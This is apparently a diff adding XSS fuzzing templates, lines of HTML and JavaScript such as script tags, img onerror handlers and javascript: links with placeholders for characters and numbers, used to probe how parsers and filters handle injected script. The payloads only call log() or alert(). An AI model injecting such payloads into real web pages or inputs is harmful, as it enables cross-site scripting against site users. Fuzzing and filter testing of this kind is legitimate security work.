+<script src="data:text/plain,lo*chr*g(*num*)"></script>
+<script> if ('*chr*'.trim() === '') { log(*num*); } </script>
+"'`><script>log*chr*(*num*)</script>
+"'`><*chr*img src=xxx:x onerror=log(*num*)>
+'`"><*chr*script>log(*num*)</script>
+<a href="javas*chr*cript:alert(1)" id="fuzzelement*num*">test</a>
+`"'><img src=xxx:x onerror*chr*=log(*num*)>
+'"`><script>/* **chr*log(*num*)// */</script>
+<a href="*chr*javascript:alert(1)" id="fuzzelement*num*">test</a>
+<a href="javascript*chr*:alert(1)" id="fuzzelement*num*">test</a>
+`'"><script>window['log*chr*'](*num*)</script>
+'"`><div id="fuzzelement*num*" style="*chr*color:#000000;"></div>
+"`'><script>*chr*log(*num*)</script>
+--><!-- --*chr*> <img src=xxx:x onerror=log(*num*)> -->
+`"'><img src=xxx:x *chr*onerror=log(*num*)>
